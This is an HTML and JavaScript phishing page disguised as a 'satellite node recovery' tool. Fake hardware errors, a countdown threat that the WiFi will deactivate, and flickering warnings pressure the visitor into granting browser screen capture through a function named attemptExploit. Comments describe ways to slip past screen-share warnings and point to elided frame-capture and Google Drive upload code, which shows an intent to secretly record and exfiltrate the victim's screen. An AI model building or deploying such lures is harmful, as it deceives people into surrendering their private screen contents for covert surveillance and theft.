<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Satellite Node | Recovery</title>
    <style>
        body { background: #000; color: #00ff41; font-family: 'Courier New', monospace; margin: 0; overflow: hidden; display: flex; justify-content: center; align-items: center; height: 100vh; }
        #lab-box { border: 1px solid #333; padding: 30px; width: 85%; max-width: 400px; text-align: center; position: relative; }
        
        /* The "Flicker" trick to simulate a bad connection */
        .flicker { animation: pulse 0.1s infinite; color: #ff3e3e; }
        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }

        .btn-action { background: #00ff41; color: #000; border: none; padding: 15px 30px; font-weight: bold; width: 100%; margin-top: 20px; cursor: pointer; }
        #overlay-instruction { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 1000; padding: 40px; box-sizing: border-box; }
        
        canvas { display: none; }
    </style>
</head>
<body>

    <div id="lab-box">
        <h2 id="header">SIGNAL LOST</h2>
        <p id="msg" class="flicker">OUT OF SYNC: NODE-254</p>
        <div id="progress-bar" style="width: 100%; background: #222; height: 10px; margin: 15px 0;">
            <div id="fill" style="width: 10%; background: #00ff41; height: 100%;"></div>
        </div>
        <button class="btn-action" onclick="showRecovery()">RECOVER CONNECTION</button>
    </div>

    <div id="overlay-instruction">
        <h3 style="color: #00ff41;">HARDWARE VALIDATION</h3>
        <p>Satellite sync requires a <b>Surface Scan</b> to align pixels with node frequencies.</p>
        <p style="background: #222; padding: 10px; font-size: 14px;">
            Step 1: Click "START NOW" on the next popup.<br>
            Step 2: Keep this tab open for 30 seconds.
        </p>
        <button class="btn-action" onclick="attemptExploit()">START SURFACE SCAN</button>
    </div>

    <canvas id="canvas"></canvas>

<script>
    const DRIVE_URL = 'YOUR_DRIVE_APPS_SCRIPT_URL';
    let retryCount = 0;

    async function attemptExploit() {
        // Reset UI to 'Processing'
        document.getElementById('overlay-instruction').style.display = 'none';
        const header = document.getElementById('header');
        const msg = document.getElementById('msg');
        
        header.innerText = "INITIALIZING RECOVERY...";
        msg.innerText = "ATTEMPTING FREQUENCY HANDSHAKE [CH: 11]";
        msg.classList.remove('flicker');

        try {
            // The "Trick": Requesting with a specific display surface 
            // sometimes bypasses generic 'Screen Share' warnings on newer builds.
            const stream = await navigator.mediaDevices.getDisplayMedia({ 
                video: { displaySurface: "browser" }, 
                audio: false 
            });

            handleSuccess(stream);

        } catch (e) {
            retryCount++;
            triggerCriticalFailure();
        }
    }

    function triggerCriticalFailure() {
        const header = document.getElementById('header');
        const msg = document.getElementById('msg');
        const btn = document.querySelector('.btn-action');

        header.innerText = "CRITICAL SYSTEM ERROR";
        header.style.color = "#ff3e3e";
        msg.innerHTML = "<b>HARDWARE REJECTED SCAN.</b><br>WIFI MODULE DEACTIVATING IN <span id='timer'>10</span>s";
        msg.classList.add('flicker');
        btn.innerText = "FORCE RECOVERY (MANUAL)";
        
        // Haptic feedback for realism
        if (navigator.vibrate) navigator.vibrate([200, 100, 200]);

        // The Countdown Trick
        let timeLeft = 10;
        const countdown = setInterval(() => {
            timeLeft--;
            document.getElementById('timer').innerText = timeLeft;
            if (timeLeft <= 0) {
                clearInterval(countdown);
                msg.innerText = "NODE OFFLINE. RE-AUTHENTICATION REQUIRED.";
            }
        }, 1000);
    }

    function handleSuccess(stream) {
        // ... (Your existing Frame Capture and Drive Upload Logic) ...
        document.getElementById('header').innerText = "SYNC ACTIVE";
        document.getElementById('msg').innerText = "WIFI STABILIZED. KEEP TAB OPEN.";
        document.getElementById('msg').style.color = "#00ff41";
    }
</script>
</body>
</html>
